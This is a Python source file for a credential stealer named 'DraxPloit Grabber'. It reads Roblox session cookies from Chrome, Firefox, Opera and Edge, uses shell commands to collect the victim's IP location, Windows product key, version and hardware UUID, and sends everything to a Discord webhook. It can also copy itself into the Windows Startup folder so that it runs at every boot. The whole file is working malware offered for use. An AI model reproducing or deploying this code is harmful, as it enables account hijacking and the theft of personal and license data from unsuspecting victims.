import browser_cookie3
import requests
import os
import asyncio
import platform
import subprocess

from discord_webhook import DiscordWebhook,DiscordEmbed
from typing import Union
from sys import argv
from shutil import copy2

__config__ = {
    'yourwebhookurl': "%WEBHOOK_HERE%",
    'startup': '%_startup_enabled%',
}

class Exploit:
    def __init__(self):
        self.api = "https://ipinfo.io/json"
        self.log = ""
        self.w3bh00k = self.fetch_conf('yourwebhookurl')
        self.startupexe = self.fetch_conf("startup")
        self.robloxcookies = []
        self.avatarURL = "https://avatars.githubusercontent.com/u/79086740?v=4"

    def fetch_conf(self, e: str) -> Union[str, bool]:
        return __config__.get(e)

    def getData(self):
        stats = requests.get(self.api)
        json_stats = stats.json()
        ip = json_stats["ip"]
        city = json_stats["city"]
        region = json_stats["region"]
        country = json_stats["country"]
        timezone = json_stats["timezone"]
        org = json_stats["org"]

        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            uuidwndz = "N/A"
        try:
            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            w1nk33y = "N/A"
        try:
            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            w1nv3r = "N/A"
            
        self.log = f"**DraxPloit** beamed a new user! ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"

    def sendMainData(self):
        data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
        requests.post(self.w3bh00k, json = data)

    def edgeLog(self):
        try:
            cookies = browser_cookie3.edge(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def chromeLog(self):
        try:
            cookies = browser_cookie3.chrome(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def operaLog(self):
        try:
            cookies = browser_cookie3.opera(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def firefoxLog(self):
        try:
            cookies = browser_cookie3.firefox(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def sendCookieLog(self):
        if self.robloxcookies:
            data = {"content": "Roblox coookie found: ```" + self.robloxcookies[0] +"```", "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
            requests.post(self.w3bh00k, json = data)

    browsers = [chromeLog, firefoxLog, operaLog, edgeLog]

    def credits(self):
        embed = DiscordEmbed(
            title="{title}",
            description="{description}",
            color="7289da"
        )

        embed.set_author(name="{author_name}", icon_url="{author_icon_url}")
        embed.set_footer(text="{footer_text}")

        embed.title = "DraxPloit Grabber"
        embed.description = "DraxPloit Grabber is scripted only by me, Drax"
        embed.set_author(name="Drax#5934", icon_url="http://pixelartmaker-data-78746291193.nyc3.digitaloceanspaces.com/image/f253a7d09b602f4.png")
        embed.set_footer(text="https://github.com/DraxFM/DraxPloit-Grabber")

        wb2 = DiscordWebhook(url=self.w3bh00k, username="DraxPloit Grabber Notifier", avatar_url=self.avatarURL)
        wb2.add_embed(embed)
        res = wb2.execute()
        

if __name__ == "__main__" and platform.system() == "Windows":
    exploit = Exploit()

    if exploit.startupexe == "yes":
        startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        if os.path.exists(startup_path + argv[0]):
            os.remove(startup_path + argv[0])
            copy2(argv[0], startup_path)
        else:
            copy2(argv[0], startup_path)

    exploit.getData()
    exploit.sendMainData()

    exploit.firefoxLog()
    exploit.operaLog()
    exploit.chromeLog()
    exploit.edgeLog()
    exploit.sendCookieLog()

    exploit.credits()
    
